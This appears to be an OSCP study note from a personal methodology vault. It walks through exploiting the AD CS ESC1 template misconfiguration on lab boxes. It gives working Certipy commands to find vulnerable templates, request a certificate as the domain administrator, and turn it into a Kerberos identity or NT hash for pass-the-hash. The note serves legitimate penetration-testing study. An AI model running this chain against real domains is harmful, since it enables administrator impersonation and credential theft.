---
box_sources: [Escape, Search]
---

# AD - Certificate Services ESC1

**Step 45C of 50 · Active Directory**

*Enumerate certificate templates, confirm ESC1 prerequisites, request a client-authentication certificate, and convert the result into a validated privileged identity.*

## Run this

> **Why:** This asks Certipy for vulnerable certificate templates using the current domain credential and saves the sensitive output privately.
```bash
certipy find -u "$Username@$Domain" -p "$Password" \
  -dc-ip "$BoxIP" -vulnerable -stdout \
  > "$BoxDir/loot/certipy-vulnerable.txt"
chmod 600 "$BoxDir/loot/certipy-vulnerable.txt"
```

Inspect the private output for a template that has all of the following:

| Property | Required result | Why it matters |
|---|---|---|
| Enrollee Supplies Subject | True | The requester can choose the subject or UPN |
| Client Authentication | Present | The certificate can authenticate to the domain |
| Enrollment rights | Current user or an allowed group | The request will be accepted |
| Certificate authority | Identified | Required by `certipy req` |

Do not treat the presence of AD CS as proof of ESC1. The template properties, enrollment ACL, and authentication EKU must align.

## Request the certificate

> **Why:** This requests a certificate from the vulnerable template with the target administrator UPN as the subject. The resulting PFX is a private authentication credential.
```bash
boxset Template UserAuthentication
boxset CAName $CAName
boxset PfxFile "$BoxDir/loot/administrator.pfx"

certipy req -u "$Username@$Domain" -p "$Password" \
  -dc-ip "$BoxIP" -ca "$CAName" -template "$Template" \
  -upn "$AdminUser@$Domain" \
  > "$BoxDir/loot/certipy-request.txt"
chmod 600 "$BoxDir/loot/certipy-request.txt" "$PfxFile"
```

`$AdminUser` is the identity to impersonate. On a real assessment, use the administrator UPN supported by the evidence and the template's policy. Do not request arbitrary subjects without first proving the template is vulnerable.

## Authenticate the PFX

> **Why:** This uses the certificate's private key to request a Kerberos identity and, where supported, returns the NT hash associated with the certificate UPN.
```bash
certipy auth -pfx "$PfxFile" -dc-ip "$BoxIP" \
  > "$BoxDir/loot/certipy-auth.txt"
chmod 600 "$BoxDir/loot/certipy-auth.txt"
```

If the result reports `KRB_AP_ERR_SKEW`, measure the DC offset and wrap only the Certipy command:

```bash
ntpdig -p 1 "$BoxIP"
faketime -f "$FakeTime" certipy auth \
  -pfx "$PfxFile" -dc-ip "$BoxIP" \
  > "$BoxDir/loot/certipy-auth.txt"
```

On Certipy v5, do not assume older guides' `-output` option exists. Use the installed help and redirect output to mode-600 loot.

## What did you get?

- [ ] No vulnerable template is reported -> **Save the result, return to [[AD - Group Triage]], and check whether the current account belongs to an enrollment group. Do not force an ESC1 route.**
- [ ] Subject control is absent -> **Do not request an administrator UPN. Return to [[AD - BloodHound]] or test another template.**
- [ ] Client authentication is absent -> **The certificate may be useful for another purpose but is not an ESC1 login credential. Continue to the next AD privilege branch.**
- [ ] The request is denied -> **Check the CA name, template name, enrollment ACL, domain, and clock before retrying once.**
- [ ] Certificate request succeeds but auth reports clock skew -> **Use [[AD - Clock Sync]] and the scoped `faketime` wrapper.**
- [ ] Certificate authentication returns an NT hash -> **Save it privately and go to [[AD - Pass the Hash]].**
- [ ] Certificate authentication succeeds without an NT hash -> **Use the certificate with a Kerberos-aware client, prove the identity, and continue to [[AD - Credential Validation]].**

## Notes

ESC1 is a certificate-template misconfiguration. The critical combination is:

```text
enrollee controls subject
        + certificate supports client authentication
        + current principal can enroll
        = possible authentication as another domain identity
```

The certificate request is not the same as pass-the-hash. Keep the PFX, any certificate password, the returned NT hash, and the final authentication proof as separate evidence items.

The domain controller's time is part of the authentication prerequisite. `faketime` changes the clock visible to one process without destabilising the VPN or the rest of the workstation.

## Gotchas

> [!warning] 💡
> A template called `UserAuthentication` is not automatically vulnerable. Read the enrollment permissions and the subject and EKU fields in the Certipy output.

> [!warning] 💡
> Requesting a certificate with the wrong UPN can produce a valid certificate that authenticates only as the requesting user. Confirm the target UPN before the request.

> [!warning] 💡
> A PFX is private key material. Keep it in `$BoxDir/loot`, set restrictive permissions, and never put it in the vault or an attachment directory.

> [!warning] 💡
> A certificate request may succeed while authentication fails because of clock skew. Treat the request and authentication as separate checkpoints.

## Seen in

- [[OSCP/BOXES/WRITE UPS/Windows/Escape|Escape]] -- anonymous SMB to MSSQL coercion, WinRM credential pivots, ESC1 certificate impersonation, and Administrator pass-the-hash
- [[OSCP/BOXES/WRITE UPS/AD/Search|Search]] -- certificate-authenticated PSWA, a separate client-certificate workflow

## Related stages

- [[AD - Service Scan]]
- [[AD - Clock Sync]]
- [[AD - Credential Validation]]
- [[AD - Group Triage]]
- [[AD - BloodHound]]
- [[AD - Pass the Hash]]
- [[AD - Clean Down]]

## External resources

- [Certipy](https://github.com/ly4k/Certipy)
- [HackTricks AD CS methodology](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates.html)
- [SpecterOps Certified Pre-Owned](https://specterops.io/blog/2021/06/17/certified-pre-owned/)

## Why this matters for OSCP

AD CS is a privilege boundary, not just another enumeration service. The examiner expects the tester to connect template configuration, enrollment ACLs, UPN control, Kerberos time, certificate authentication, and the final remote-authentication method. This stage keeps those decisions explicit and prevents a generic certificate finding from being mistaken for a working ESC1 path.
